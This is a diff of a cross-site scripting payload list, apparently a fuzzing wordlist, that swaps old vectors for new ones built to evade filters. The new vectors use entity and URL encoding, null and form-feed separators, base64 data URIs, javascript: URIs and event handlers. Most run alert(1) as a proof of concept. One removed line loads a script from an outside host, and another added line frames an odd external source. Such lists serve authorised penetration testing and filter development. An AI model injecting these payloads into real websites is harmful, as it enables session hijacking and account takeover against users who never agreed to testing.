@@ -1,29 +1,18 @@
 "'>
 </xss>
-<sCrIt>alert(1)</SCRIPT>
-<script>alert`1`</script>
-<script>a=eval;b=alert;a(b(/i/.source));</script>
-<script>eval(630038579..toString(30))(1)</script>
-<script src="//0-q.cc/uGuMag"></scrIpt>
-<script>alert%0a%0d(1);</script>
-<img src=x onerror="al%26%23x65rt(1)">
-<svg/onload=aler%26%23x74(1)>
-<svg><script>alert&#x0028;1)</script>
-<object data="dat%26%23x61:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
-<embed src="dat%26%23x61:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
-<input value=x oncut=aler%26%23x74(1)>
-<input type=image src=0 onerror=alert(1)>
-<script/src=data:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,alert(1)></script>
-<? foo="><script>alert(1)</script>">
-<! foo="><script>alert(1)</script>">
-</ foo="><script>alert(1)</script>">
-<iframe src="javascript:alert(1)"
-<iframe srcdoc="&lt;svg/onload=alert(1)&gt;"></iframe>
-<base href="javascript:\"><a href=/**/alert(1)>XSS</a>
-<a href=*/alert(1)>XSS</a><base href="javascript:/*\">
-<noembed><img src="</noembed><iframe onload=alert(1)>" /></noembed>
-<img/src=="x onerror=alert(1)//">
-<body onresize="alert(1)"> 
-<details ontoggle=$.getScript(x)>
-<video%20onloadstart="$.get%26%2383cript(x)"><source%20src=></video>
-
+<svg><script/==>al%26%23x65rt(1)</script ?
+<img/src="x"onerror="al%26%23x65rt(1)">
+<object/data="da%26%23x74;a:text/html,<svg/onload=al%26%23x65rt(1)>">
+<object/data="dat%26%23x61:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<form><button/formaction=jav%26%23x61%3Bscript:%26%23x61%3Blert(1)>sublimt
+<input/value=x%0Concut=aler%26%23x74(1)>
+<input/type=image%0Csrc=0%0Conerror=aler%26%23x74(1)>
+<input/onblur=aler%26%23x74(1)%0Cautofocus>
+<iframe%0C%00%0Csrc="javascrip%26%23x74:promp%26%23x74(1)"%00>
+<iframe/srcdoc="&lt;svg/onload=alert(1)&gt;"></iframe>
+<img/src=="x%20onerror=aler%26%23x(1)//">
+<audio/src="x"onloadstart=al%26%23x65%3Brt(1)></audio>
+<svg><script/xlink:href=data::,aler%26%23x74%3B(1)></script
+<object/data=data::,aler%26%23x74%3B(1)>
+<body/onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+<iframe sandbox="allow-same-origin allow-forms allow-scripts" src="//1.1"></iframe>
